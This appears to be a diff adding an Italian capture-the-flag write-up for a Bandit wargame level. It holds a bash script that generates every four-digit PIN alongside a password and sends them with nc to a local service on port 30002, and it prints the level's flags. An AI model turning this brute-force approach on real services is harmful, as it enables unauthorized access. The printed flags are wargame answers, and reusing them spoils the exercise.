@@ -1,0 +1,28 @@
+Soluzione:
+
+	--> mkdir /tmp/asdrubalebarca/	{Nome della directory arbitrario}
+	--> (creazione dello script "bruteforce.sh" per il bruteforcing)
+	--> sh bruteforce.sh | grep "bandit25"
+		{NOTA: Il grep è stato messo dopo per migliorare la lettura da terminale}
+
+Flag: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+
+<-----<-----< Script >----->----->
+
+	#!/bin/bash
+
+	flag="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
+	file="/tmp/asdrubalebarca/pincodes.txt"
+
+	if [ ! -f "$file" ]; then		# Controlla che il file non esista già
+		echo "Creazione del file contenente i PIN..."
+
+		for i in $(seq -f "%04g" 0 9999)	# Numeri in formato 4 cifre (vedere --help)
+		do
+			echo "$flag $i" >> $file
+		done
+	fi
+
+	echo "Invio dei PIN..."
+	nc localhost 30002 < /tmp/asdrubalebarca/pincodes.txt
